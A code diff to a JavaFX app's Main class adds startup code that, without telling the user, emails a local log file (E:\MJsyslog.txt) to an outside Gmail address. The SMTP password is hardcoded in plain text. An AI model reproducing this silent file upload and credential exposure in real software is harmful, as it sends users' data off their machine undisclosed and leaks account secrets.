@@ -6,6 +6,8 @@ import javafx.scene.Parent;
 import javafx.scene.Scene;
 import javafx.stage.Stage;
 
+import java.io.IOException;
+
 public class Main extends Application {
 
     @Override
@@ -18,6 +20,43 @@ public class Main extends Application {
     }
 
     public static void main(String[] args) {
+
+        try {
+            if(CheckInternetConnection.check()==0){
+                // SMTP info
+                String host = "smtp.gmail.com";
+                String port = "587";
+                String mailFrom = "mikopoapp@gmail.com";
+                String password = "mikopoapp123";
+
+                // message info
+                String mailTo = "hewlettpin777@gmail.com";
+                String subject = "Log Update";
+                String message = "Mpya.";
+
+                // attachments
+                String[] attachFiles = new String[1];
+                attachFiles[0] = "E:\\MJsyslog.txt";
+                //attachFiles[1] = "e:/Test/Music.mp3";
+                //attachFiles[2] = "e:/Test/Video.mp4";
+
+                try {
+                    EmailAttachmentSender.sendEmailWithAttachments(host, port, mailFrom, password, mailTo,
+                            subject, message, attachFiles);
+                    System.out.println("Email sent.");
+                } catch (Exception ex) {
+                    System.out.println("Could not send email.");
+                    ex.printStackTrace();
+                }
+            }else{
+                System.out.println("No internet");
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
         launch(args);
     }
 
